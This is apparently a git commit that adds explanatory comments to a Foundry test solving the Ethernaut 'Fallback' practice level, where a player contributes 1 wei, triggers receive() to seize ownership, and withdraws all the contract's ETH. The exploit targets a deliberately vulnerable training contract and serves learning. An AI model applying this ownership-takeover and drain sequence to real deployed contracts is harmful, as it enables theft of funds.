a6abbb81d55043c2d3d4fc4e91c193862ec03bc7
hark017 <harrykhoja017@gmail.com>
2026-01-23 15:07:46 +0530

    added comments in the Fallback.t.sol

--- src/fallback/Fallback.t.sol
+++ src/fallback/Fallback.t.sol
@@ -19,15 +19,15 @@ contract FallbackTest is Test {
 
     function test_exploitFallback() public {
         vm.startPrank(player);
-        level.contribute{value: 1 wei}();
-        assertEq(level.contributions(player), 1 wei, "Contribution not registered");
-        (bool sent,) = address(level).call{value: 1 wei}("");
+        level.contribute{value: 1 wei}(); // Call the contribute function with 1 wei
+        assertEq(level.contributions(player), 1 wei, "Contribution not registered"); 
+        (bool sent,) = address(level).call{value: 1 wei}(""); // send 1 wei to the instance contract to provoke the receive() function and take ownership of the contract
         assertTrue(sent, "Sending ETH failed");
         assertEq(level.owner(), player, "Player did not become owner via receive()");
-        level.withdraw();
-        uint256 balanceAfter = address(level).balance;
-        assertEq(balanceAfter, 0, "Contract still has ETH after withdraw");
-        assertEq(level.owner(), player, "Final owner check failed");
+        level.withdraw(); // You can withdraw all the ETH, as you are the owner of the contract 
+        uint256 balanceAfter = address(level).balance; // final balance 
+        assertEq(balanceAfter, 0, "Contract still has ETH after withdraw "); // Final balance should be 0
+        assertEq(level.owner(), player, "Final owner check failed"); // Player should be the owner
         vm.stopPrank();
         console2.log("Exploit successful!");
         console2.log("Player is now owner:", player);
@@ -35,4 +35,3 @@ contract FallbackTest is Test {
     }
 }
 
-///dfsjhgkjzdhsbfgjhzsdbgjkhseklrfhgkjdlfrghkjdsfhg
